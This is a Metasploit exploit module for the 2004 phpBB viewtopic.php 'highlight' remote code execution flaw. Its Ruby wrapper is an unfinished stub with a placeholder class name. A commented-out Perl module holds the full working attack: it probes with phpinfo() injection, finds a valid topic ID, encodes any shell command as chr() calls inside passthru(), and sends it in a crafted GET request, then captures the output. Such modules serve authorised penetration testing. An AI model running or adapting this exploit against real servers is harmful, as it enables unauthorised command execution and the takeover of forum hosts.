require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'phpBB viewtopic.php Arbitrary Code Execution',
			'Description'    => %q{
				This module exploits two arbitrary PHP code execution flaws
				in the phpBB forum system. The problem is that the
				'highlight' parameter in the 'viewtopic.php' script is not
				verified properly and will allow an attacker to inject
				arbitrary code via preg_replace().
					
			},
			'Author'         => [ 'Anthony S. Clark(valsmith) <asclark@lanl.gov>', 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '11719'],
					[ 'OSVDB', '17613'],
					[ 'MIL', '85'],
					[ 'BID', '14086'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Nov 12 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::phpbb_highlight;
use base "Msf::Exploit";
use Pex::Text;
use strict;

my $advanced = { };

my $info =
  {
	'Name'  => 'phpBB viewtopic.php Arbitrary Code Execution',
	'Version'  => '$Revision$',
	'Authors' =>
	  [
		'Anthony S. Clark(valsmith) <asclark [at] lanl.gov>',
		'H D Moore <hdm [at] metasploit.com>',
	  ],

	'Arch'  => [ ],
	'OS'    => [ ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'PHPBB_ROOT' => [1, 'URL', 'The phpBB root Directory', '/phpbb'],
		'TOPIC' => [0, 'DATA', 'The ID of a valid topic'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'    => 1024,
		'Keys'     => ['cmd', 'cmd_bash'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This module exploits two arbitrary PHP code execution flaws in the
	phpBB forum system. The problem is that the 'highlight' parameter
	in the 'viewtopic.php' script is not verified properly and will
	allow an attacker to inject arbitrary code via preg_replace().
}),

	'Refs'  =>
	  [
		['OSVDB',   '11719'],
		['OSVDB',   '17613'],
		['MIL',     '85'],
		['BID',     '14086'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Autotarget',0],
		['phpbb <2.0.11', 1],
		['phpbb <2.0.15', 2],
	  ],

	'Keys'  =>  ['phpBB'],

	'DisclosureDate' => 'Nov 12 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $vhost       = $self->GetVar('VHOST') || $target_host;
	my $cmd         = $self->GetVar('EncodedPayload')->RawPayload;
	my $target_idx  = $self->GetVar('TARGET');
	my $phpbb_root  = $self->GetVar('PHPBB_ROOT');
	my $topic       = $self->GetVar('TOPIC') || $self->FindTopic();
	my $target      = $self->Targets->[$target_idx];
	my $url;
	my $byte;

	if (! $topic) {
		$self->PrintLine("[*] No valid topic ID found, please specify the TOPIC option.");
		return;
	}

	# Add an echo on each end for easy output capturing
	$cmd = "echo _cmd_beg_;".$cmd.";echo _cmd_end_";

	# Encode the command as a set of chr() function calls

	if ($target_idx == 0) {

		$url = $phpbb_root."/viewtopic.php?t=$topic&highlight=";
		$url .= "%2527"."%252e"."phpinfo()". "%252e"."%2527";

		my $request =
		  "GET $url HTTP/1.1\r\n".
		  "Host: $vhost:$target_port\r\n".
		  "Connection: Close\r\n".
		  "\r\n";

		$self->PrintLine("[*] Trying to determine which attack method to use...");
		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'SSL'       => $self->GetVar('SSL'),
		  );
		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		$s->Send($request);
		my $results = $s->Recv(-1, 20);
		$s->Close();

		if ($results =~ /\<title>phpinfo/) {
			$target_idx = 1;
		}

		else { $target_idx = 2; }

	}

	if ($target_idx =~ /1/) {
		$byte = join('%252e', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));
		$url = $phpbb_root."/viewtopic.php?t=$topic&highlight=";
		$url .= "%2527"."%252e"."passthru($byte)". "%252e"."%2527";
	}

	if ($target_idx =~ /2/) {
		$byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));
		$url = $phpbb_root."/viewtopic.php?t=$topic&highlight=";
		$url .= "%27."."passthru($byte)".".%27";

	}

	my $request =
	  "GET $url HTTP/1.1\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	$self->PrintLine("[*] Sending the malicious GET request...");
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);
	my $results = $s->Recv(-1, 20);
	$s->Close();

	if ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {
		my $out = $1;
		$out =~ s/^\s+|\s+$//gs;
		if ($out) {
			$self->PrintLine('----------------------------------------');
			$self->PrintLine('');
			$self->PrintLine($out);
			$self->PrintLine('');
			$self->PrintLine('----------------------------------------');
		}
	}

	return;
}

sub FindTopic {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $vhost       = $self->GetVar('VHOST') || $target_host;
	my $phpbb_root  = $self->GetVar('PHPBB_ROOT');

	for (my $topic = 1; $topic < 32; $topic++ ) {

		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'SSL'       => $self->GetVar('SSL'),
		  );

		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		$self->PrintLine("[*] Checking topic ID value $topic...");

		my $request =
		  "GET $phpbb_root/viewtopic.php?topic=$topic HTTP/1.1\r\n".
		  "Host: $vhost:$target_port\r\n".
		  "Connection: Close\r\n".
		  "\r\n";

		$s->Send($request);
		my $results = $s->Recv(-1, 20);
		$s->Close();

		if ($results =~ /class="postdetails"/s) {;
			$self->PrintLine("[*] Discovered valid topic ID value $topic");
			return $topic;
		}
	}

	return;
}

1;

=end


end
end	
